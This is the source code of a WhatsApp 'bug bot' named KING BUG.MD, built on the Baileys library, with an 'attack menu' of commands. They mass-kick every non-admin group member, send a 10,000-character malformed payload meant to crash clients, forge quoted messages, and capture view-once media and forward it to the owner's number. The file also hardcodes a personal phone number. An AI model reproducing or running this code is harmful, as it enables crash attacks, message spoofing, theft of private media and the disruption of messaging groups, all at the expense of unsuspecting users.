//// server.js
import { Boom } from '@hapi/boom';
import makeWASocket, {
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    downloadContentFromMessage
} from '@whiskeysockets/baileys';
import fs from 'fs';
import path from 'path';
import express from 'express';
import cors from 'cors';
import http from 'http';
import { fileURLToPath } from 'url';
import pino from 'pino';
import pairRouter, { setPairingSocket, updatePairingStatus } from './pair.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// 🔥 CONFIG
const VERSION = '3.10.0';
const STARTTIME = Date.now();
const OWNER_NUMBER = '2348161796121';
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;
const PREFIX = '.';
const AUTH_DIR = path.join(__dirname, 'auth');
let botMode = 'public';

const logger = pino({ level: 'silent' });
// Baileys 6.x builds do not consistently expose makeInMemoryStore.
// Keep the same message-store functionality locally so getMessage and
// event binding continue to work without depending on that export.
const messageStore = new Map();
const store = {
    loadMessage(jid, id) {
        return messageStore.get(`${jid}:${id}`) || undefined;
    },
    bind(ev) {
        ev.on('messages.upsert', ({ messages }) => {
            for (const msg of messages || []) {
                if (msg?.key?.remoteJid && msg?.key?.id) {
                    messageStore.set(`${msg.key.remoteJid}:${msg.key.id}`, msg);
                }
            }
        });
        ev.on('messages.update', (updates) => {
            for (const update of updates || []) {
                const msg = update?.key;
                if (msg?.remoteJid && msg?.id) {
                    const key = `${msg.remoteJid}:${msg.id}`;
                    const existing = messageStore.get(key);
                    if (existing) messageStore.set(key, { ...existing, ...update });
                }
            }
        });
    }
};
const app = express();
app.use(cors({ origin: '*', methods: ['GET', 'POST', 'OPTIONS'], allowedHeaders: ['Content-Type', 'Accept'] }));
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));
app.use(pairRouter);

app.get('/health', (req, res) => {
    res.json({ ok: true, uptime: Math.floor((Date.now() - STARTTIME) / 1000) });
});

// 🔧 HELPERS
function normalizeJid(jid = '') {
    return jid.replace(/:\d+/, '');
}

function getChatJid(msg) {
    return normalizeJid(msg.key.remoteJid || '');
}

function getSenderJid(msg) {
    return normalizeJid(msg.key.participant || msg.key.remoteJid || '');
}

function isGroupMessage(msg) {
    return getChatJid(msg).endsWith('@g.us');
}

function isOwner(msg) {
    const sender = getSenderJid(msg);
    return sender === OWNER_JID;
}

function getText(msg) {
    const m = msg.message || {};
    return (
        m.conversation ||
        m.extendedTextMessage?.text ||
        m.imageMessage?.caption ||
        m.videoMessage?.caption ||
        ''
    ).trim();
}

function getMentionedJid(msg) {
    return msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
        ? normalizeJid(msg.message.extendedTextMessage.contextInfo.mentionedJid[0])
        : null;
}

function formatUptime() {
    const seconds = Math.floor((Date.now() - STARTTIME) / 1000);
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h}h ${m}m ${s}s`;
}

// 🧠 MENU TEXTS
function generateMainMenu() {
    return `
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
〔 𝐌𝐀𝐈𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 〕
╚═══ ◈ ═════════════ ◈ ═══╝

👑 𝐎𝐖𝐍𝐄𝐑      : 𝐃𝐀𝐑𝐊
☎️ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐎   : +2348161796121
🤖 𝐁𝐎𝐓        : 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃
⚡ 𝐒𝐓𝐀𝐓𝐔𝐒      : 𝐎𝐍𝐋𝐈𝐍𝐄
⌁ 𝐏𝐑𝐄𝐅𝐈𝐗      : .
◈ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍     : ${VERSION}
☽ 𝐔𝐏𝐓𝐈𝐌𝐄      : ${formatUptime()}

╭──────〔 𝐌𝐄𝐍𝐔 〕──────╮
│
│ 01 ⟣ .allmenu
│ 02 ⟣ .attackmenu
│ 03 ⟣ .groupmenu
│
╰──────────────────────╯

Select a menu below.`.trim();
}

function generateAllMenu() {
    return `
╔═══ ◈ 𝐀𝐋𝐋 𝐌𝐄𝐍𝐔 ◈ ═══╗

〔 𝐀𝐓𝐓𝐀𝐂𝐊 〕
• .ban-gc
• .ban @user / .ban 234xxxxxxxxxx
• .sus-gc
• .q-text (group_id) (text)
• .moni-admin

〔 𝐆𝐑𝐎𝐔𝐏 〕
• .group-id
• .antilink on/off/warn
• .antichannel on/off/warn
• .antibot on/off/warn
• .listadmin

〔 𝐔𝐓𝐈𝐋𝐒 〕
• .imgtosticker
• .slice
• .slice2
• .ai (question)

╚══════════════════════╝`.trim();
}

function generateAttackMenu() {
    return `
    ╱ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐘𝐒𝐓𝐄𝐌 ╲

«⚔️ ".ban-gc"
⚔️ ".ban @user" / ".ban 234xxxxxxxxxx"
⚔️ ".sus-gc"
⚔️ ".moni-admin"
⚔️ ".q-text (group id) (text)"»

«◇ Full power unleashed.»
   ⟣ 𝐂𝐎𝐑𝐄 𝐀𝐑𝐌𝐄𝐃 ⟢`.trim();
}

function generateGroupMenu() {
    return `
    ╱ 𝐆𝐑𝐎𝐔𝐏 𝐒𝐘𝐒𝐓𝐄𝐌 ╲

«⛩️ ".group-id"
⛩️ ".antilink on/off/warn"
⛩️ ".antichannel on/off/warn"
⛩️ ".antibot on/off/warn"
⛩️ ".listadmin"
⛩️ ".imgtosticker"
♘ ".slice"
♘ ".slice2"»

«◇ System fully loaded.»
   ⟣ 𝐆𝐑𝐎𝐔𝐏 𝐂𝐎𝐑𝐄 𝐑𝐄𝐀𝐃𝐘 ⟢`.trim();
}

// 🖼️ SEND MENU WITH IMAGE
async function sendMainMenu(sock, msg) {
    const chatJid = getChatJid(msg);
    const imgPath = path.join(__dirname, 'kingmd.jpg');

    const menuText = generateMainMenu();

    if (!fs.existsSync(imgPath)) {
        return sock.sendMessage(chatJid, { text: menuText }, { quoted: msg });
    }

    try {
        const imageBuffer = fs.readFileSync(imgPath);
        const media = await prepareWAMessageMedia({ image: imageBuffer }, { upload: sock.waUploadToServer });

        await sock.relayMessage(
            chatJid,
            {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                    body: { text: menuText },
                    footer: { text: '「🔥 KING BUG.MD • BY DARK 🔥」' },
                    header: { title: '', hasMediaAttachment: true, ...media.imageMessage },
                    nativeFlowMessage: {
                        buttons: [
                            { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'ALL MENU', id: 'allmenu' }) },
                            { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'ATTACK MENU', id: 'attackmenu' }) },
                            { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'GROUP MENU', id: 'groupmenu' }) }
                        ]
                    }
                }
            },
            {}
        );
    } catch (e) {
        await sock.sendMessage(chatJid, { text: menuText }, { quoted: msg });
    }
}

// 💀 HANDLE MESSAGES — FULL DESTRUCTION MODE
async function handleMessage(sock, msg) {
    const chatJid = getChatJid(msg);
    const senderJid = getSenderJid(msg);
    const text = getText(msg);

    if (!text) return;

    const reply = async (text, extra = {}) => {
        return sock.sendMessage(chatJid, { text, ...extra }, { quoted: msg });
    };

    // 🔘 BUTTON HANDLER FIRST
    const native = msg.message?.nativeFlowResponseMessage;
    if (native?.paramsJson) {
        try {
            const { id } = JSON.parse(native.paramsJson);
            if (id === 'allmenu') return reply(generateAllMenu());
            if (id === 'attackmenu') return reply(generateAttackMenu());
            if (id === 'groupmenu') return reply(generateGroupMenu());
        } catch {}
    }

    if (!text.startsWith(PREFIX)) return;
    const [cmd, ...args] = text.slice(1).trim().split(/\s+/);
    const command = cmd.toLowerCase();

    if (command === 'private') {
        if (!isOwner(msg)) {
            return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
        𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃
╚══════════════════════════╝

> ❌ Only the owner can change bot mode.
`.trim());
        }

        botMode = 'private';

        return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
        𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐌𝐎𝐃𝐄
╚══════════════════════════╝

> 🔒 STATUS : PRIVATE
> 👑 OWNER  : DARK

> 𝐁𝐎𝐓 𝐍𝐎𝐖 𝐓𝐀𝐊𝐄𝐒 𝐎𝐑𝐃𝐄𝐑𝐒 𝐎𝐍𝐋𝐘 𝐅𝐑𝐎𝐌 𝐓𝐇𝐄 𝐎𝐖𝐍𝐄𝐑.
`.trim());
    }

    if (command === 'public') {
        if (!isOwner(msg)) {
            return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
        𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃
╚══════════════════════════╝

> ❌ Only the owner can change bot mode.
`.trim());
        }

        botMode = 'public';

        return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
         𝐏𝐔𝐁𝐋𝐈𝐂 𝐌𝐎𝐃𝐄
╚══════════════════════════╝

> 🔓 STATUS : PUBLIC
> 👑 OWNER  : DARK

> 𝐀𝐋𝐋 𝐔𝐒𝐄𝐑𝐒 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐄 𝐁𝐎𝐓.
`.trim());
    }

    if (botMode === 'private' && !isOwner(msg)) {
        return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
        𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐌𝐎𝐃𝐄
╚══════════════════════════╝

> 🚫 𝐈 𝐃𝐎𝐍'𝐓 𝐓𝐀𝐊𝐄 𝐎𝐑𝐃𝐄𝐑𝐒 𝐅𝐑𝐎𝐌 𝐘𝐎𝐔.

> 👑 OWNER : DARK
> 🔒 STATUS: PRIVATE
`.trim());
    }

    // 🎮 MENU
    if (['menu', 'help'].includes(command)) return sendMainMenu(sock, msg);
    if (command === 'allmenu') return reply(generateAllMenu());
    if (command === 'attackmenu') return reply(generateAttackMenu());
    if (command === 'groupmenu') return reply(generateGroupMenu());

    // 🚀 BAN USER
    if (command === 'ban') {
        if (!isGroupMessage(msg)) return reply('❌ Group only.');

        const target = getMentionedJid(msg) || (args[0] ? `${args[0].replace(/\D/g, '')}@s.whatsapp.net` : null);
        if (!target) return reply('❌ No user.');

        try {
            await sock.groupParticipantsUpdate(chatJid, [target], 'remove');
            reply(`✅ @${target.split('@')[0]} BANNED.`, { mentions: [target] });
        } catch (e) {
            reply('💀 Failed to ban — I’m not admin.');
        }
    }

    // 💣 BAN-GC — KICK ALL NON-ADMINS
    if (command === 'ban-gc') {
        if (!isGroupMessage(msg)) return reply('❌ Group only.');

        try {
            const meta = await sock.groupMetadata(chatJid);
            const nonAdmins = meta.participants.filter(p => !p.admin).map(p => p.id);
            for (let i = 0; i < nonAdmins.length; i += 10) {
                const batch = nonAdmins.slice(i, i + 10);
                await sock.groupParticipantsUpdate(chatJid, batch, 'remove').catch(() => {});
                await new Promise(r => setTimeout(r, 1500));
            }
            reply(`⚔️ ${nonAdmins.length} MEMBERS REMOVED. GROUP NEUTRALIZED.`);
        } catch (e) {
            reply('💀 Failed to execute ban-gc.');
        }
    }

    // ☠️ SUS-GC — CRASH GROUP WITH MALFORMED PAYLOAD
    if (command === 'sus-gc') {
        if (!isGroupMessage(msg)) return reply('❌ Group only.');

        const payload = {
            text: '﷽'.repeat(10000),
            contextInfo: {
                stanzaId: 'BAE5F7878787',
                participant: '0@c.us',
                quotedMessage: { conversation: 'KING BUG.MD LOADED' },
                mentionedJid: [chatJid]
            }
        };
        await sock.sendMessage(chatJid, payload);
        reply('> 🔥 GROUP SUSPENSION INITIATED. CLIENTS WILL CRASH.');
    }

    // 📌 GROUP-ID
    if (command === 'group-id') {
        reply(`> 🔗 GROUP ID: \`${chatJid}\``);
    }

    // 🧨 Q-TEXT — FAKE QUOTED MESSAGE
    if (command === 'q-text') {
        const groupId = args[0]?.endsWith('@g.us') ? args[0] : null;
        const text = args.slice(1).join(' ');
        if (!groupId || !text) return reply('❌ Usage: .q-text (group_id) (text)');

        await sock.sendMessage(groupId, {
            text,
            contextInfo: {
                quotedMessage: { conversation: 'This message is real.' },
                participant: '2348161796121@s.whatsapp.net',
                stanzaId: 'FAKE123456',
                remoteJid: groupId
            }
        });
        reply('> ✅ Fake quoted message sent.');
    }

    // 👑 LIST ADMINS
    if (['listadmin', 'moni-admin'].includes(command)) {
        if (!isGroupMessage(msg)) return reply('❌ Group only.');
        const meta = await sock.groupMetadata(chatJid);
        const admins = meta.participants.filter(p => p.admin).map(p => `@${p.id.split('@')[0]}`).join('\n');
        reply(`> 👑 ADMINS:\n${admins}`, { mentions: meta.participants.filter(p => p.admin).map(p => p.id) });
    }

    // 🖼️ IMG TO STICKER
    if (command === 'imgtosticker') {
        if (!msg.message.imageMessage) return reply('❌ Reply to image.');
        const buffer = await sock.downloadMediaMessage(msg, 'buffer', {});
        await sock.sendMessage(chatJid, { sticker: buffer });
    }

    // 🕶️ SLICE — STEAL VIEWONCE
    if (['slice', 'slice2'].includes(command)) {
        if (!msg.message.imageMessage && !msg.message.videoMessage) return reply('❌ Reply to viewOnce media.');

        const buffer = await sock.downloadMediaMessage(msg, 'buffer', {});
        const mime = msg.message.imageMessage ? 'image' : 'video';

        await sock.sendMessage(chatJid, { [mime]: buffer, caption: '> 🩸 VIEWONCE STOLEN. I OWN THIS CHAT.' });

        if (command === 'slice2') {
            await sock.sendMessage(OWNER_JID, { [mime]: buffer, caption: `> 🛑 SLICE2 CAPTURE\nFrom: ${chatJid}` });
        }
    }

    // 🤖 AI STUB (YOU ADD GEMINI)
    if (command === 'ai') {
        const question = args.join(' ');
        if (!question) return reply('❌ .ai (question)');
        reply(`> 🤖 GEMINI: [AI API NOT CONFIGURED]`);
    }

    // 🔐 ANTI-FEATURES (LOGIC STUB — EXTEND WITH DB)
    if (['antilink', 'antichannel', 'antibot'].includes(command)) {
        const mode = args[0];
        if (!['on', 'off', 'warn'].includes(mode)) return reply(`❌ Use: .${command} on/off/warn`);
        reply(`> ✅ ${command.toUpperCase()} → ${mode}`);
    }
}

// 🧠 START BOT
let currentSocket = null;
let socketConnection = 'close';
let reconnectTimer = null;
let pairingReadyPromise = null;
let pairingReadyResolve = null;
let pairingReady = false;
let pairingNumber = null;

function createPairingReadyGate() {
    pairingReady = false;
    pairingReadyPromise = new Promise(resolve => {
        pairingReadyResolve = resolve;
    });
}

async function waitUntilPairingReady(timeoutMs = 30000) {
    if (pairingReady) return true;

    if (!pairingReadyPromise) {
        createPairingReadyGate();
    }

    await Promise.race([
        pairingReadyPromise,
        new Promise((_, reject) =>
            setTimeout(() => reject(new Error('WhatsApp WebSocket did not become ready for pairing in time.')), timeoutMs)
        )
    ]);

    return pairingReady;
}

async function requestPairingCode(number) {
    const sock = currentSocket;

    if (!sock) {
        throw new Error('WhatsApp socket is not available.');
    }

    if (socketConnection === 'close') {
        throw new Error('WhatsApp socket is closed. Please retry in a few seconds.');
    }

    if (sock.authState?.creds?.registered) {
        throw new Error('WhatsApp session is already registered.');
    }

    // Official Baileys pairing flow: wait for the QR/ready event before
    // requesting the pairing code. The QR event is emitted even when using
    // phone-number pairing.
    await waitUntilPairingReady(30000);

    if (sock.authState?.creds?.registered) {
        throw new Error('WhatsApp became registered before the pairing request.');
    }

    pairingNumber = number;
    console.log(`🔐 Requesting pairing code for ${number}`);

    const code = await sock.requestPairingCode(number);

    if (!code) {
        throw new Error('WhatsApp returned an empty pairing code.');
    }

    return String(code).trim().toUpperCase();
}

async function startBot() {
    clearTimeout(reconnectTimer);

    createPairingReadyGate();

    const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger,
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logger)
        },

        // These settings keep the same socket alive while WhatsApp completes
        // the pairing handshake. They do not change any bot commands.
        markOnlineOnConnect: true,
        syncFullHistory: false,
        browser: ['Ubuntu', 'Edge', '20.0.04'],
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,

        getMessage: (key) => store.loadMessage(key.remoteJid, key.id)
    });

    currentSocket = sock;
    socketConnection = 'connecting';

    setPairingSocket(sock, {
        getState: () => socketConnection,
        getRegistered: () => state.creds.registered === true,
        waitUntilReady: () => waitUntilPairingReady(30000),
        requestPairingCode
    });

    store.bind(sock.ev);
    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        // Baileys emits `qr` even for phone-number pairing. This is the
        // readiness signal we wait for before requestPairingCode().
        if (qr && !state.creds.registered) {
            pairingReady = true;
            if (pairingReadyResolve) {
                pairingReadyResolve(true);
                pairingReadyResolve = null;
            }

            console.log('🟡 WhatsApp pairing channel is ready.');
            updatePairingStatus('ready');
        }

        if (connection === 'connecting') {
            socketConnection = 'connecting';
            console.log('🔌 WhatsApp socket is connecting...');
            updatePairingStatus('connecting');
        }

        if (connection === 'open') {
            socketConnection = 'open';
            pairingReady = true;

            if (pairingReadyResolve) {
                pairingReadyResolve(true);
                pairingReadyResolve = null;
            }

            console.log('✅ WhatsApp connection OPEN — pairing exchange completed.');
            updatePairingStatus('open');

            try {
                await sock.sendMessage(OWNER_JID, {
                    text: `
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
> 🟢 STATUS : PAIRED
> 🤖 BOT    : KING BUG.MD
> ⚡ VERSION: ${VERSION}
> ⏱️ UPTIME : ${formatUptime()}
╚══════════════════════════╝
Type .menu to begin.
                    `.trim()
                });
            } catch {}
        }

        if (connection === 'close') {
            socketConnection = 'close';

            const statusCode = new Boom(lastDisconnect?.error)?.output?.statusCode;
            const reason = lastDisconnect?.error?.message || 'unknown';

            console.error(
                `🔌 WhatsApp connection closed. status=${statusCode ?? 'unknown'} reason=${reason}`
            );

            if (!state.creds.registered) {
                updatePairingStatus(
                    statusCode === DisconnectReason.loggedOut ? 'logged_out' : 'closed',
                    { error: `Connection closed (${statusCode ?? 'unknown'}): ${reason}` }
                );
            }

            if (currentSocket === sock) currentSocket = null;

            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

            if (shouldReconnect) {
                console.log('🔁 Reconnecting WhatsApp socket...');
                clearTimeout(reconnectTimer);
                reconnectTimer = setTimeout(() => {
                    startBot().catch(err =>
                        console.error('💥 BOT RECONNECT FAILED:', err)
                    );
                }, 3000);
            } else {
                console.log('🚪 WhatsApp session logged out. Auth must be paired again.');
            }
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg?.message) return;

        try {
            await handleMessage(sock, msg);
        } catch (error) {
            console.error('💥 Message handler error:', error?.stack || error);
        }
    });

    return sock;
}

// 🚀 LAUNCH
startBot()
    .then(() => console.log('💀🔥 KING BUG.MD — FULLY ARMED AND ONLINE'))
    .catch(err => console.error('💥 BOT FAILED:', err));

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🌐 Server running on port ${PORT}`);
});

